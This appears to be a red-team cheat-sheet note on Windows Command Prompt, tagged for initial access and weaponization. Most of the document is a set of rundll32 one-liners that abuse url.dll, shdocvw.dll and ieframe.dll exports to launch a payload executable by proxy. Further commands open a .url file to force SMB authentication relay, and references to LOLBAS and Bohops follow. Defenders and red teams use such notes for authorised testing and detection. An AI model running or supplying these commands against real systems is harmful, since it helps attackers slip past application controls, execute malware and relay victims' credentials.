---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - living-off-the-land
  - windows
---
# Command Prompt

## 01 - Common Files

```
C:\Windows\System32\cmd.exe
C:\Windows\SysWOW64\cmd.exe
```

## 02 - Execute Payloads

> [!INFO] [Character Maximum Limit](https://learn.microsoft.com/en-us/troubleshoot/windows-client/shell-experience/command-line-string-limitation)
> The maximum length of characters in a string is 8192 characters when executing through a command prompt.

Execute commands.

```
C:\> rundll32.exe url.dll,OpenURL "<drive_letter>:\absolute\path\to\payload.exe"

C:\> rundll32.exe url.dll,OpenURL "file://<drive_letter>:/absolute/path/to/payload.exe"

C:\> rundll32.exe url.dll,FileProtocolHandler "<drive_letter>:\absolute\path\to\payload.exe"

C:\> rundll32.exe url.dll,FileProtocolHandler "file:////<drive_letter>:/absolute/path/to/payload.exe"

C:\> rundll32.exe url.dll,OpenURLA "<drive_letter>:\absolute\path\to\payload.exe"

C:\> rundll32.exe shdocvw.dll,OpenURL "<drive_letter>:\absolute\path\to\payload.exe"

C:\> rundll32.exe ieframe.dll,OpenURL "<drive_letter>:\absolute\path\to\payload.exe"
```

Execute command to perform SMB authentication relay.

```
C:\> rundll32.exe url.dll,OpenURL "<drive_letter>:\absolute\path\to\payload.url"

C:\> rundll32.exe url.dll,OpenURL "file://<drive_letter>:/absolute/path/to/payload.url"

C:\> rundll32.exe url.dll,OpenURLA "<drive_letter>:\absolute\path\to\payload.url"

C:\> rundll32.exe url.dll,OpenURLA "file://<drive_letter>:/absolute/path/to/payload.url"
```

---
## References

### LOLBAS

- [LOLBAS: Rundll32](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/)

- [LOLBAS: Url](https://lolbas-project.github.io/lolbas/Libraries/Url/)

### Bohops

- [Bohops: Abusing Exported Functions and Exposed DCOM Interfaces for Pass-Thru Command Execution and Lateral Movement](https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/)